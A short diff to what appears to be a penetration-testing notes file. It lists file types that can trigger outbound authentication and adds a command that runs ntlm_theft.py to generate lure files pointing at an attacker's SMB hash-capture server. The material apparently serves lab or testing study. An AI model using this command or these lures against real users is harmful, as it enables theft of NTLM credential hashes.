@@ -54,6 +54,8 @@ Open Document
 .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
 .jnlp – via Java external jar
 .application – via any Browser (Must be served via a browser downloaded or won’t run)
+
+python3 ntlm_theft.py -g all -s 192.168.45.172(The IP address of your SMB hash capture server) -f contracts
 ```
 #### HTTP
 ```
